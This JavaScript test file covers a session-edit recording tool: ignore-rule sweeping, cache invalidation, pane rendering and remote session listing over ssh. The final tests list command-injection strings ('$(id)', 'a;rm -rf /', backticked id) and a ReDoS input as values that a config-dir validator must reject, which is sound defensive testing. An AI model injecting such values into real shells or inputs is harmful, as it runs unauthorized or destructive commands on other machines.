test('ignore: a session whose edits are ALL ignored renders as empty, and says nothing false', () => {
  // An over-broad rule (a stray `*`, `src/` where `dist/` was meant) means nothing is recorded at
  // all. Under one mode the pane is genuinely empty and there is no count to state — so the thing to
  // assert is that it does not invent one, and that the empty-state text is the ordinary one.
  const base = paneFixture();
  const empty = { ...base, views: { ...base.views, list: { edits: [] } } };
  const frame = tui.renderDashFrame(empty, { cols: 150, rows: 34, color: false });
  assert.ok(frame.find((l) => /F3 Traces/.test(l)), 'positive control: the pane is rendered');
  assert.ok(!frame.some((l) => /observatoryignore/.test(l)),
    'no ignore notice — nothing was filtered, so there is nothing to explain');
});

test('ignore: the sweep moves every derived surface, because it rewrites the log they key on', () => {
  // The two-mode design needed three cache stamps to mention the ignore files, and a missed one was
  // invisible: it looked like the feature worked and then served a stale answer forever. One mode
  // deletes that whole class of bug — the sweep rewrites log.jsonl, and every derived cache already
  // keys on it. This asserts that property rather than trusting it.
  freshHome();
  const S = 'ign-stamps';
  const cwd = tmpWork();
  editHook(S, cwd, path.join(cwd, 'a.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'keep.ts'), 'k\n', 'K\n');
  const ig = path.join(cwd, '.observatoryignore');

  assert.equal(core.sessionCounts(S).edits, 2, 'both, to start');
  assert.equal(core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }).summary.units, 2);
  const idsBefore = core.promptWindows(cwd, S).flatMap((w) => w.editIds ?? []);

  fs.writeFileSync(ig, 'a.ts\n');
  // The rule alone changes nothing about what is already recorded — that is the point of the sweep,
  // and asserting it here is what proves the numbers below come from the sweep and not from a filter
  // that quietly survived.
  assert.equal(core.sessionCounts(S).edits, 2, 'a new rule does not retroactively hide anything');

  const res = core.dropIgnored(S);
  assert.equal(res.dropped, 1, 'the sweep removed the now-covered record');
  core.clearFsCache(); // the in-process memo would answer before any disk cache is consulted
  assert.equal(core.sessionCounts(S).edits, 1, 'the counts follow');
  assert.equal(core.cachedChangeMap(cwd, S, { root: cwd, prompts: true }).summary.units, 1, 'and the on-disk map cache');
  const idsAfter = core.promptWindows(cwd, S).flatMap((w) => w.editIds ?? []);
  assert.ok(idsAfter.length < idsBefore.length || idsBefore.length === 0,
    'and the rewind id set, which must never revert a record that no longer exists');
  assert.equal(core.readSweep(S).dropped, 1, 'and the session records what was destroyed');
});

test('remote: the shell fallback actually lists sessions — it is RUN, not just generated', () => {
  // The python scanner covers most hosts, so a fault in the fallback stayed invisible until someone
  // hit a host without python3. One was there: `~` was passed to `sh` inside single quotes, which no
  // shell expands, so `[ -d "$d" ]` failed, the script printed NOPROJECTS, and every such host
  // reported "reachable, no sessions". Nothing had ever executed this script.
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'rem-home-'));
  const proj = path.join(home, '.claude', 'projects', '-tmp-work');
  fs.mkdirSync(proj, { recursive: true });
  fs.writeFileSync(path.join(proj, 'sess-a.jsonl'),
    JSON.stringify({ type: 'user', message: { role: 'user', content: 'remote ask' } }) + '\n');

  // `~` — the default. Run the SHIPPED script under a HOME that holds the fixture.
  const script = core.__remoteFallbackScript('~/.claude');
  const out = cp.execFileSync('sh', ['-c', script], { encoding: 'utf8', env: { ...process.env, HOME: home } });
  assert.match(out.split('\n')[0], /^OK$/, 'the tilde form finds the directory (it used to print NOPROJECTS)');
  const rows = core.__parseRemoteRows(out);
  assert.equal(rows.length, 1, 'and lists the session');
  assert.equal(rows[0].id, 'sess-a');
  assert.equal(rows[0].slug, '-tmp-work');
  assert.ok(rows[0].lastActiveMs > 0, 'with a real mtime, not 0');

  // An explicit absolute dir must work too — that path is quoted, and quoting is correct there.
  const abs = core.__remoteFallbackScript(path.join(home, '.claude'));
  const out2 = cp.execFileSync('sh', ['-c', abs], { encoding: 'utf8', env: { ...process.env, HOME: '/nonexistent' } });
  assert.equal(core.__parseRemoteRows(out2).length, 1, 'an absolute config dir does not depend on $HOME');

  // NOPROJECTS is still reported for a host that genuinely has none — the positive control for the
  // sentinel this all keys on.
  const none = core.__remoteFallbackScript(path.join(home, 'nope'));
  assert.match(cp.execFileSync('sh', ['-c', none], { encoding: 'utf8' }).trim(), /^NOPROJECTS$/);
  fs.rmSync(home, { recursive: true, force: true });
});

test('remote: the listing cache survives a process boundary, so a poll cannot ssh every tick', () => {
  // JetBrains passes `--remote` on its ~3-second poll, and every CLI spawn is a FRESH process — so an
  // in-process Map never hit even once, while a comment claimed it absorbed the cost. Each tick paid
  // a full synchronous ssh. The disk tier is what makes that comment true.
  freshHome();
  const host = { name: 'probe', host: 'probe.invalid' };
  const t0 = 1_700_000_000_000;
  const first = core.remoteRows([host], { now: t0 });
  assert.equal(first.length, 1, 'an unreachable host still yields a ROW, never silence');
  assert.ok(first[0].error, 'and the row carries the reason');

  // A NEW process would have an empty Map. Simulate exactly that by clearing only the in-process
  // tier — if the disk tier works, the answer still comes back without another ssh.
  const cacheDir = path.join(core.rootDir(), 'remote-cache');
  assert.ok(fs.existsSync(cacheDir), 'the listing was written to disk');
  const files = fs.readdirSync(cacheDir);
  assert.equal(files.length, 1, 'one entry per (host, configDir)');
  const stampBefore = fs.statSync(path.join(cacheDir, files[0])).mtimeMs;

  // Force the DISK tier to be the one that answers. Without this the in-process Map serves the
  // second call and the cross-process claim — the whole reason this cache exists — is untested.
  // `clearRemoteCache` drops both tiers, so the Map is emptied by hand instead.
  core.__clearRemoteMemoOnly();
  const again = core.remoteRows([host], { now: t0 + 1000 });
  assert.deepEqual(again.map((r) => r.id), first.map((r) => r.id), 'a FRESH process shape still gets the answer');
  assert.ok(again[0].error, 'including the reason the host failed');
  assert.equal(fs.statSync(path.join(cacheDir, files[0])).mtimeMs, stampBefore, 'and it was not rewritten');
  // 0600 in a 0700 directory: these entries hold session titles from another machine. POSIX mode bits
  // do not exist on Windows — `mode & 0o777` there reports a synthesized value that says nothing about
  // who can read the file — so the claim is only meaningful where the bits are real.
  if (process.platform !== 'win32') {
    assert.equal(fs.statSync(path.join(cacheDir, files[0])).mode & 0o777, 0o600, 'the entry is not world-readable');
    assert.equal(fs.statSync(cacheDir).mode & 0o777, 0o700, 'nor is its directory');
  }

  // Past the TTL it asks again…
  core.remoteRows([host], { now: t0 + 61_000 });
  // …and an explicit clear drops the disk tier too, or "retry this host now" would be a no-op.
  core.clearRemoteCache();
  assert.ok(!fs.existsSync(cacheDir) || fs.readdirSync(cacheDir).length === 0,
    'clearRemoteCache clears the cross-process tier as well');
});

test('panes: the change map’s row list depends on the pane WIDTH, so a resolver must pass it', () => {
  // `rowsFor` defaults to 100 columns — a rendering width, not a neutral one. On the map a long
  // folder name wraps onto continuation rows, so the row LIST at 78 columns (what Detail gets at
  // 120x34) is not the list at 100. Every keyboard resolver used the default while the pane drew at
  // its real width, so Enter folded a different node than the highlighted one.
  const long = (n) => `${n}-package-with-a-deliberately-long-name/inner/leaf.ts`;
  const files = [1, 2, 3].map((i) => ({
    rel: long(`alpha${i}`), cnt: 2, added: 9, removed: 1, status: 'pending',
    module: `alpha${i}-package-with-a-deliberately-long-name/inner`,
    moduleLabel: `alpha${i}-package-with-a-deliberately-long-name/inner`,
    file: 'leaf.ts', churn: 10, kept: 0, pending: 2, undone: 0,
  }));
  const st = { ...paneFixture(), screen: 'map', views: { ...paneFixture().views, changemap: { summary: {}, files } } };
  const wide = tui.rowsFor(st, 140);
  const narrow = tui.rowsFor(st, 40);
  assert.notEqual(narrow.length, wide.length,
    'a narrower pane genuinely produces a different row list — otherwise this test proves nothing');
  // …and the openPath at a given index differs, which is what made Enter act on the wrong node.
  const firstDiff = wide.findIndex((r, i) => (narrow[i]?.openPath ?? null) !== (r.openPath ?? null));
  assert.ok(firstDiff >= 0, 'and the two lists disagree about what row N is');
});

test('ignore: `clean --resolved` clears exactly what the reader was shown', () => {
  // The bug this guards: VS Code counted the confirmation one way and `clean --resolved` acted on
  // another, so the modal said "Clear 1 resolved edit(s)?" and three went. Under one mode the two
  // sets are the same log, which is the fix — asserted here rather than assumed.
  freshHome();
  const S = 'ign-clear';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'dist/\n');
  fs.mkdirSync(path.join(cwd, 'dist'), { recursive: true });
  editHook(S, cwd, path.join(cwd, 'src.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'dist', 'one.js'), 'b\n', 'B\n');
  editHook(S, cwd, path.join(cwd, 'dist', 'two.js'), 'c\n', 'C\n');
  assert.equal(core.readLog(S).length, 1, 'the dist pair was never recorded');
  core.setStatusMany(S, core.readLog(S).map((r) => r.id), 'kept');

  const shown = core.readLog(S).filter((r) => r.status !== 'pending').length;
  assert.equal(shown, 1, 'the reader is shown one resolved edit');
  assert.equal(core.clearResolved(S), shown, 'and exactly that many are cleared');
  assert.equal(core.readLog(S).length, 0, 'leaving nothing behind');
});

test('ignore: a file that exists but cannot be read is REPORTED, never treated as absent', () => {
  // `stampOf` proves the file is there (its directory was readable), so a read failure is a
  // permissions problem — and returning the same `null` that "no file" returns makes a whole rule set
  // silently stop applying. Under one mode this fails in the SAFE direction (more is captured, not
  // less), which is exactly why it must still be said out loud: the reader believes a path is
  // excluded and it is not.
  const root = ignoreWork({ '.observatoryignore': 'secret.txt\n' });
  const file = path.join(root, '.observatoryignore');
  // Enforced by the OS, so skip where it cannot be (a root-owned CI runner ignores mode 000).
  fs.chmodSync(file, 0o000);
  let readable = true;
  try { fs.readFileSync(file, 'utf8'); } catch { readable = false; }
  if (!readable) {
    const ctx = core.ignoreContext({ home: null });
    assert.equal(ctx.ignored(path.join(root, 'secret.txt')), false,
      'the rules genuinely are not in force — that part is unavoidable');
    const problems = core.ignoreProblems();
    assert.ok(problems.some((p) => p.includes(file)), 'but the file is NAMED');
    assert.ok(problems.some((p) => /NOT in force/.test(p)), 'and the consequence is stated');
  }
  fs.chmodSync(file, 0o644);
  // Positive control: once readable, the rule applies and nothing is reported for it.
  const ok = core.ignoreContext({ home: null });
  assert.equal(ok.ignored(path.join(root, 'secret.txt')), true);
  assert.ok(!core.ignoreProblems().some((p) => p.includes(file)), 'and the problem clears');
});

test('sweep: the gate notices a rule created, edited and deleted — driven through the real hook', () => {
  // The two-mode design memoized the matcher per session and had to revalidate it; one mode replaced
  // that with a stamp over the ignore files reachable from the session's directories. The failure
  // mode is the same either way and it is silent: miss a change and the rule looks like it works
  // while nothing ever happens. Every case below goes through the CAPTURE HOOK, so it measures the
  // shipped trigger and not a helper.
  freshHome();
  const S = 'sweep-gate';
  const cwd = tmpWork();
  const ig = path.join(cwd, '.observatoryignore');
  const recorded = () => core.readLog(S).map((r) => path.basename(r.file)).sort();

  editHook(S, cwd, path.join(cwd, 'a.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'b.ts'), 'b\n', 'B\n');
  assert.deepEqual(recorded(), ['a.ts', 'b.ts'], 'both to start');

  // CREATED, then one more capture — the trigger.
  fs.writeFileSync(ig, 'a.ts\n');
  editHook(S, cwd, path.join(cwd, 'c.ts'), 'c\n', 'C\n');
  assert.deepEqual(recorded(), ['b.ts', 'c.ts'], 'a brand-new rule sweeps the record it now covers');

  // EDITED — same path, different rule. The previously swept file cannot come back (its record is
  // gone for good), but the newly covered one must go.
  fs.writeFileSync(ig, 'b.ts\n');
  editHook(S, cwd, path.join(cwd, 'd.ts'), 'd\n', 'D\n');
  assert.deepEqual(recorded(), ['c.ts', 'd.ts'], 'editing the file is caught too');

  // DELETED — nothing is swept, and nothing that survived is disturbed.
  fs.rmSync(ig);
  editHook(S, cwd, path.join(cwd, 'e.ts'), 'e\n', 'E\n');
  assert.deepEqual(recorded(), ['c.ts', 'd.ts', 'e.ts'], 'removing the rule sweeps nothing');

  // The PER-CHECKOUT tier moves independently of the shared one, so the stamp has to cover both
  // names per directory; dropping either half is a rule that silently never fires.
  fs.mkdirSync(path.join(cwd, '.git', 'info'), { recursive: true });
  fs.writeFileSync(path.join(cwd, '.git', 'info', 'observatoryignore'), 'c.ts\n');
  editHook(S, cwd, path.join(cwd, 'f.ts'), 'f\n', 'F\n');
  assert.deepEqual(recorded(), ['d.ts', 'e.ts', 'f.ts'], 'a .git/info rule fires as well');
  assert.equal(core.readSweep(S).dropped, 3, 'and the session totals what was destroyed');
});

test('sweep: a rule BELOW cwd fires too — the Bash walk reports where it actually wrote', () => {
  // The gate stamped only the directory the hook was INVOKED from. A Bash walk records at any depth
  // beneath cwd, so a `.observatoryignore` created in one of those deeper directories was invisible
  // to the stamp: the rule refused new captures immediately, while the records it covered stayed in
  // the store forever with nothing to move the stamp. Found by the pre-commit review, reproduced end
  // to end, and this is that reproduction.
  freshHome();
  const S = 'sweep-below';
  const cwd = tmpWork();
  const deep = path.join(cwd, 'sub', 'deep');
  fs.mkdirSync(deep, { recursive: true });

  bashHook(S, cwd, 'PreToolUse');
  fs.writeFileSync(path.join(deep, 'a.txt'), 'hello\nworld\n');
  bashHook(S, cwd, 'PostToolUse');
  assert.deepEqual(core.readLog(S).map((r) => path.basename(r.file)), ['a.txt'], 'the deep file is recorded');

  // The rule goes in the directory the file LIVES in — three levels below cwd.
  fs.writeFileSync(path.join(deep, '.observatoryignore'), '*\n');
  assert.equal(core.ignoreContext().ignored(path.join(deep, 'a.txt')), true,
    'the rule is live for new captures — so a surviving record is the GATE being blind, not the matcher');

  // One more command, run from cwd as before.
  bashHook(S, cwd, 'PreToolUse');
  fs.writeFileSync(path.join(cwd, 'top.txt'), 'x\n');
  bashHook(S, cwd, 'PostToolUse');

  assert.deepEqual(core.readLog(S).map((r) => path.basename(r.file)), ['top.txt'],
    'the covered record is swept, even though the rule sits below the directory the hook was invoked from');
  assert.equal(core.readSweep(S).dropped, 1);
});

test('sweep: a rule at an ANCESTOR of the edited files still fires, and from ANY directory', () => {
  // The two mistakes a cheap gate makes, both silent:
  //   1. stamping only the directories files live IN — the matcher walks every ancestor, so a rule at
  //      `<repo>/.observatoryignore` governing `<repo>/sub/*` never invalidates anything;
  //   2. stamping only the CURRENT capture's own chain — a rule written for one directory then never
  //      fires, because the next edit happens somewhere else.
  // The second is the common case: you add `dist/` and then keep working in `src/`.
  freshHome();
  const S = 'sweep-ancestor';
  const cwd = tmpWork();
  fs.mkdirSync(path.join(cwd, 'sub'), { recursive: true });
  fs.mkdirSync(path.join(cwd, 'other'), { recursive: true });
  editHook(S, cwd, path.join(cwd, 'sub', 'a.ts'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'sub', 'keep.md'), 'k\n', 'K\n');
  const recorded = () => core.readLog(S).map((r) => path.basename(r.file)).sort();
  assert.deepEqual(recorded(), ['a.ts', 'keep.md']);

  // The rule at the PARENT of every edited file, and the next capture in a DIFFERENT directory.
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'a.ts\n');
  editHook(S, cwd, path.join(cwd, 'other', 'z.ts'), 'z\n', 'Z\n');
  assert.deepEqual(recorded(), ['keep.md', 'z.ts'],
    'an ancestor rule fires on a capture that is not beneath the rule it was written for');

  // The per-checkout tier lives at a repo ROOT, which is an ancestor almost by definition.
  fs.mkdirSync(path.join(cwd, '.git', 'info'), { recursive: true });
  fs.writeFileSync(path.join(cwd, '.git', 'info', 'observatoryignore'), 'keep.md\n');
  editHook(S, cwd, path.join(cwd, 'other', 'y.ts'), 'y\n', 'Y\n');
  assert.deepEqual(recorded(), ['y.ts', 'z.ts'], 'and so does a repo-private rule at the root');
});

test('sweep: it does not run when nothing changed, and never rewrites for nothing', () => {
  // Two properties that keep this off the critical path. It sits on the capture hook, so a store
  // rewrite per edit would be a real cost — and a mtime that moves on every capture would invalidate
  // every derived cache in the product.
  freshHome();
  const S = 'sweep-quiet';
  const cwd = tmpWork();
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'nothing-matches-this\n');
  editHook(S, cwd, path.join(cwd, 'a.ts'), 'a\n', 'A\n');
  const logFile = core.logPath(S);
  const before = fs.statSync(logFile).mtimeMs;
  const sizeBefore = fs.statSync(logFile).size;
  // Ten more gate runs with the rules unchanged — the second and later ones must be pure no-ops.
  for (let i = 0; i < 10; i++) core.sweepIgnoredIfChanged(S, cwd);
  assert.equal(fs.statSync(logFile).mtimeMs, before, 'an unchanged stamp rewrites nothing');
  assert.equal(fs.statSync(logFile).size, sizeBefore);
  assert.equal(core.readSweep(S), null, 'and records no sweep');

  // Positive control: a rule that DOES match proves the probe can tell the difference.
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), 'a.ts\n');
  const res = core.sweepIgnoredIfChanged(S, cwd);
  assert.ok(res && res.dropped === 1, 'the same call sweeps once the rule covers something');
  assert.equal(core.readLog(S).length, 0);
});

test('sweep: it retires the skip marker for a file the rules now cover', () => {
  // A skip marker names a path and says "a real edit here was not captured". Leaving one behind for
  // a now-ignored file keeps reporting the very path the reader asked never to be recorded.
  freshHome();
  const S = 'sweep-skips';
  const cwd = tmpWork();
  core.ensureStore(S);
  core.appendSkip(S, path.join(cwd, 'huge.bin'), 'file too large');
  core.appendSkip(S, path.join(cwd, 'real.ts'), 'file too large');
  core.appendSkip(S, '<bash-tree>', 'walk truncated');
  assert.equal(core.readSkips(S).length, 3);
  // A record too, so the sweep has something to drop — it returns early when nothing matches.
  editHook(S, cwd, path.join(cwd, 'huge.bin.ts'), 'x\n', 'y\n');

  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.bin\n*.bin.ts\n');
  core.dropIgnored(S);
  const left = core.readSkips(S).map((k) => path.basename(k.file)).sort();
  assert.deepEqual(left, ['<bash-tree>', 'real.ts'],
    'the covered marker is gone; the uncovered one and the non-path sentinel both survive');
});

test('sweep: the swept op is cumulative, not one line per sweep', () => {
  // The op is carried verbatim through every later log rewrite, so appending one per sweep would
  // grow the log for the lifetime of the session and make readSweep slower forever.
  freshHome();
  const S = 'sweep-op';
  const cwd = tmpWork();
  editHook(S, cwd, path.join(cwd, 'a.log'), 'a\n', 'A\n');
  editHook(S, cwd, path.join(cwd, 'b.tmp'), 'b\n', 'B\n');
  editHook(S, cwd, path.join(cwd, 'keep.ts'), 'k\n', 'K\n');

  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.log\n');
  assert.equal(core.dropIgnored(S).dropped, 1);
  fs.writeFileSync(path.join(cwd, '.observatoryignore'), '*.log\n*.tmp\n');
  assert.equal(core.dropIgnored(S).dropped, 1);

  const opLines = fs.readFileSync(core.logPath(S), 'utf8').split('\n')
    .filter((l) => l.includes('"swept"'));
  assert.equal(opLines.length, 1, 'exactly one swept line, however many sweeps ran');
  assert.equal(core.readSweep(S).dropped, 2, 'and it totals both');
  assert.equal(core.readSweep(S).files, 2);
  assert.equal(core.readLog(S).length, 1, 'with the uncovered edit untouched');
});

test('remote: the config-dir check is linear, and accepts exactly what the regex did', () => {
  // This guards a string that is interpolated into a shell on ANOTHER machine, and it used to be a
  // regex whose `$VAR` head and path tail overlapped on letters, digits and underscore — so a long
  // `$AAAA…` could be split between them many ways and the match was polynomial (CodeQL:
  // js/polynomial-redos). Every regex repair for that also MOVED the accepted set, which is not a
  // trade worth making on a shell-adjacent validator, so it became a one-pass scan.
  //
  // The risk of hand-writing it is drift, so the original regex is kept here as the oracle and the two
  // are compared over every short string in a hostile alphabet plus a large random sample.
  const ORIGINAL = /^(?:\$[A-Za-z_][A-Za-z0-9_]*|~|\/)[A-Za-z0-9._\-\/]*$/;
  const alpha = ['$', '~', '/', 'a', 'Z', '0', '9', '_', '.', '-', ';', '`', '(', ')', ' ', '"', "'", '\\', '*', '\n'];
  let compared = 0;
  const walk = (str, depth) => {
    if (str.length) {
      compared++;
      assert.equal(core.CONFIG_DIR_OK.test(str), ORIGINAL.test(str), `disagreed on ${JSON.stringify(str)}`);
    }
    if (!depth) return;
    for (const c of alpha) walk(str + c, depth - 1);
  };
  walk('', 3); // every string up to length 3 over that alphabet
  for (let i = 0; i < 20_000; i++) {
    let str = '';
    const len = 1 + (i % 12);
    for (let k = 0; k < len; k++) str += alpha[(i * 7 + k * 13) % alpha.length];
    compared++;
    assert.equal(core.CONFIG_DIR_OK.test(str), ORIGINAL.test(str), `disagreed on ${JSON.stringify(str)}`);
  }
  assert.ok(compared > 25_000, `the comparison must actually run, did ${compared}`);

  // …and the shape that made the old one quadratic is now trivial. Bounded by TIME rather than by a
  // fixed threshold ratio: the original takes seconds on this input, the scan takes about a millisecond.
  const hostile = '$' + 'A'.repeat(50_000) + '!';
  const started = Date.now();
  assert.equal(core.CONFIG_DIR_OK.test(hostile), false, 'still refused, for the right reason');
  assert.ok(Date.now() - started < 250, `50k characters must not backtrack (took ${Date.now() - started}ms)`);
});

test('remote: a config dir cannot smuggle a command onto the other machine', () => {
  // The `$`-leading form is passed to the remote shell UNQUOTED on purpose, so `$HOME/.claude` and
  // `$CLAUDE_CONFIG_DIR` work. That is exactly why it cannot be a free string: in that position
  // `$(...)` is command substitution, executed THERE. It reached the shell through prefs.json and
  // through the options window, neither of which validated it — only the host was checked.
  for (const bad of ['$(touch /tmp/x)/.claude', 'a;rm -rf /', '`id`', '~/my dir', '"x"', '$(id)']) {
    assert.equal(core.CONFIG_DIR_OK.test(bad), false, `${bad} must be refused`);
    const r = core.listRemoteSessions({ name: 'x', host: 'somehost', configDir: bad });
    assert.match(String(r.error), /not a usable config directory/, `${bad} refused before any spawn`);
    assert.equal(r.reachable, false);
  }
  // …and every legitimate form still works, or the guard has broken the feature instead of the hole.
  for (const ok of ['~/.claude', '$HOME/.claude', '$CLAUDE_CONFIG_DIR', '/opt/claude', '~']) {
    assert.equal(core.CONFIG_DIR_OK.test(ok), true, `${ok} must be accepted`);
  }
  // The settings file is the other door: a hostile value there is dropped on read, and the rest of
  // the entry survives rather than the whole remote vanishing.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'cc-cfgdir-'));
  const file = path.join(dir, 'prefs.json');
  fs.writeFileSync(file, JSON.stringify({ remotes: [{ name: 'nova', host: 'nova', configDir: '$(id)' }] }));
  const p = core.readPrefs(file);
  assert.equal(p.remotes.length, 1, 'the host is kept');
  assert.equal(p.remotes[0].configDir, undefined, 'and the unusable config dir is dropped');
  fs.rmSync(dir, { recursive: true, force: true });
});
